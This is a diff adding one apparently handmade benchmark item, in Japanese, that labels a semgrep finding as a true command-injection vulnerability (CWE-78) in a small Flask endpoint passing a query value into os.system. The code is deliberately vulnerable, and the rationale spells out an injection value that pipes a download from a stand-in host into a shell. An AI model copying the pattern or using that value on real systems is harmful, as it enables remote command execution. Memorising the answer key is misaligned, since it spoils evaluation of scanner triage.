@@ -1,0 +1,35 @@
+# 真陽性: HTTP のクエリ値が os.system に直接連結される。
+id: hand-0005
+source: handmade
+language: python
+candidate:
+  scanner: semgrep
+  rule_id: python.lang.security.audit.dangerous-system-call
+  category: sast
+  message: os.system にユーザー入力が渡っています
+  path: app/convert.py
+  start_line: 10
+  end_line: 10
+  severity_reported: high
+  cwe:
+  - CWE-78
+code: |
+  import os
+  from flask import Flask, request
+
+  app = Flask(__name__)
+
+
+  @app.post("/convert")
+  def convert():
+      name = request.args.get("file", "")
+      os.system("convert uploads/" + name + " out.png")
+      return "ok"
+ground_truth:
+  vulnerable: true
+  cwe:
+  - CWE-78
+  severity: critical
+  rationale: |
+    file クエリはリクエストからそのまま取り出され、検証なしにシェルコマンド文字列へ連結される。
+    ルートに認証が無く、`a.png; curl evil | sh` のような値で任意コマンドを実行できる。
